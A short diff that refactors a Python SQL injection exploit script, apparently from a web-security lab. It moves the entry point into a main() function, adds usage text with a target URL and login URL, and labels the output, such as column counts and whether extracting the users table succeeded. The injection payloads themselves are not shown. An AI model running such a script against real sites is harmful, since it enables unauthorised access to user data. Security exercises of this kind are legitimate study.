@@ -77,12 +77,16 @@ def exploit_sqli(url):
     return counter
     
 
+def main():
+    if len(sys.argv) != 3:
+        print(f"(+) Usage: {sys.argv[0]} <url> <loginUrl>")
+        print(f"(+) Example: {sys.argv[0]} https://target.com/ https://target.com/login")
+        sys.exit(-1)
 
-if __name__ == '__main__':
     url = sys.argv[1]
     loginUrl = sys.argv[2]
     numCols = exploit_sqli(url)
-    print(numCols)
+    print(f'(+) Number of returned columns: {numCols}')
 
     # Assume we already tested the database version
 
@@ -96,3 +100,11 @@ if __name__ == '__main__':
             print("(-) SQL injection failed")
     else:
         print("(-) Unable to get the users table")
+    
+    
+
+if __name__ == "__main__":
+    main()
+
+
+    
